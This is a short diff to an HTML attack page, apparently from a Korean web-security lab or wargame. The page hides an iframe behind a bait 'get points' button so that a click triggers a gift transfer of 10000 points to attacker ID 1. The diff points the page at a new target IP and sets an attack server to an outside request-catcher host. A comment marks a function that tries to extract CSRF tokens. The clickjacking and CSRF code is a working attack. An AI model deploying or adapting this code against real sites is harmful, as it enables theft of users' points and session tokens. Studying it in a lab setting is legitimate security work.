@@ -91,7 +91,7 @@
         <div class="clickjacking-container">
             <button>💰 포인트 받기 💰</button>
             <iframe class="legitimate-button" 
-                    src="http://15.164.95.252/profile.php?send_gift=1&receiver_id=1&points=10000"
+                    src="http://3.34.181.145/profile.php?send_gift=1&receiver_id=1&points=10000"
                     frameborder="0">
             </iframe>
         </div>
@@ -101,8 +101,8 @@
     
     <script>
         const ATTACKER_ID = '1';
-        const TARGET_SNS = 'http://15.164.95.252';
-        const ATTACK_SERVER = 'http://127.0.0.1:5000';
+        const TARGET_SNS = 'http://3.34.181.145';
+        const ATTACK_SERVER = 'https://enxzoji.request.dreamhack.games';
         
         // 1. CSRF 토큰 추출 시도
         async function tryExtractCSRFToken() {
